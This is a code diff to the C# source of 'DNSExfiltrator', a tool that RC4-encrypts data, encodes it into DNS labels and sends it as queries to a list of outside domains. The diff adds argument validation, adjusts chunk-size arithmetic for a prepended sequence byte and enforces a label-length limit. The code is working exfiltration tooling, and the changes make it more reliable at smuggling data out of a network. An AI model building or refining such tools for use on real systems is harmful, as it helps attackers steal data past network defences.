@@ -174,14 +174,47 @@ namespace DNSExfiltrator
                 int i = 3;
                 while (i < args.Length)
                 {
-                    if (args[i].StartsWith("s=")) dnsServer = args[i].Split('=')[1];
-                    else if (args[i].StartsWith("t=")) throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("tr=")) throttleRandomTime = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("l=")) labelMaxSize = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("e=")) encoding = args[i].Split('=')[1];
-                    else if (args[i].StartsWith("retry=")) maxRetries = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("retrydelay=")) retryDelay = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("dil=")) dilRate = Convert.ToInt32(args[i].Split('=')[1]);
+                    string arg = args[i];
+                    try
+                    {
+                        if (arg.StartsWith("s=")) dnsServer = arg.Split('=')[1];
+                        else if (arg.StartsWith("t="))
+                        {
+                            throttleTime = Convert.ToInt32(arg.Split('=')[1]);
+                            if (throttleTime < 0) throw new ArgumentException("Throttle time cannot be negative");
+                        }
+                        else if (arg.StartsWith("tr="))
+                        {
+                            throttleRandomTime = Convert.ToInt32(arg.Split('=')[1]);
+                            if (throttleRandomTime < 0) throw new ArgumentException("Random throttle time cannot be negative");
+                        }
+                        else if (arg.StartsWith("l="))
+                        {
+                            labelMaxSize = Convert.ToInt32(arg.Split('=')[1]);
+                            if (labelMaxSize < 1 || labelMaxSize > 63) throw new ArgumentException("Label max size must be 1-63");
+                        }
+                        else if (arg.StartsWith("e=")) encoding = arg.Split('=')[1];
+                        else if (arg.StartsWith("retry="))
+                        {
+                            maxRetries = Convert.ToInt32(arg.Split('=')[1]);
+                            if (maxRetries < 0) throw new ArgumentException("Retry count cannot be negative");
+                        }
+                        else if (arg.StartsWith("retrydelay="))
+                        {
+                            retryDelay = Convert.ToInt32(arg.Split('=')[1]);
+                            if (retryDelay < 0) throw new ArgumentException("Retry delay cannot be negative");
+                        }
+                        else if (arg.StartsWith("dil="))
+                        {
+                            dilRate = Convert.ToInt32(arg.Split('=')[1]);
+                            if (dilRate < 0) throw new ArgumentException("Dilution rate cannot be negative");
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        PrintColor("[!] Invalid argument: " + arg + " - " + e.Message);
+                        return;
+                    }
                     i++;
                 }
             }
@@ -302,29 +335,38 @@ namespace DNSExfiltrator
             RC4 rc4 = new RC4(Encoding.UTF8.GetBytes(password));
 
             // Calculate chunk size in bytes based on encoding (account for encoding overhead)
+            // FIX for B2-ENC-001: Account for sequence byte that is prepended to each chunk
+            // The chunk will be: [sequence_byte(1) + data_chunk(chunkSize)]
             int chunkSize;
+            int overheadBytes = 1; // 1 for sequence byte
+            
             switch (encoding)
             {
                 case "base64":
-                    // base64: 3 bytes = 4 chars, so for L chars: floor(L * 3 / 4) bytes
-                    chunkSize = (effectiveLabelSize * 3) / 4;
+                    // base64: n bytes -> ceil(n * 4/3) chars
+                    // We need: ceil((chunkSize + overheadBytes) * 4/3) <= effectiveLabelSize
+                    chunkSize = (effectiveLabelSize * 3) / 4 - overheadBytes;
+                    if (chunkSize < 0) chunkSize = 0;
                     break;
                 case "hex":
-                    // hex: 1 byte = 2 chars
-                    chunkSize = effectiveLabelSize / 2;
+                    // hex: n bytes -> n * 2 chars
+                    chunkSize = effectiveLabelSize / 2 - overheadBytes;
+                    if (chunkSize < 0) chunkSize = 0;
                     break;
                 case "base32map":
-                    // base32map: effectiveLabelSize is number of base32 chars, each maps to 3 final chars
-                    // base32: 5 bytes = 8 chars, so for L base32 chars: floor(L * 5 / 8) bytes
-                    chunkSize = (effectiveLabelSize * 5) / 8;
+                    // base32map: effectiveLabelSize is the max label chars
+                    // Each base32 char maps to 3 final chars
+                    int maxBase32Chars = effectiveLabelSize / 3;
+                    chunkSize = (maxBase32Chars * 5) / 8 - overheadBytes;
+                    if (chunkSize < 0) chunkSize = 0;
                     break;
                 case "base32":
-                    // base32: 5 bytes = 8 chars (5 bits per base32 char)
-                    chunkSize = (effectiveLabelSize * 5) / 8;
+                    chunkSize = (effectiveLabelSize * 5) / 8 - overheadBytes;
+                    if (chunkSize < 0) chunkSize = 0;
                     break;
                 default:
-                    // fallback to base64 calculation
-                    chunkSize = (effectiveLabelSize * 3) / 4;
+                    chunkSize = (effectiveLabelSize * 3) / 4 - overheadBytes;
+                    if (chunkSize < 0) chunkSize = 0;
                     break;
             }
 
@@ -360,6 +402,13 @@ namespace DNSExfiltrator
 
                 // Encode
                 string encodedChunk = Encode(encryptedChunk, encoding).ToLower();
+
+                // FIX for B3-CHK-001: Enforce label length limit
+                if (encodedChunk.Length > labelMaxSize)
+                {
+                    PrintColor(String.Format("[!] ERROR: Encoded chunk exceeds labelMaxSize! ({0} > {1})", encodedChunk.Length, labelMaxSize));
+                    continue;
+                }
 
                 // Send as single label (no separate sequence number)
                 string request = encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];
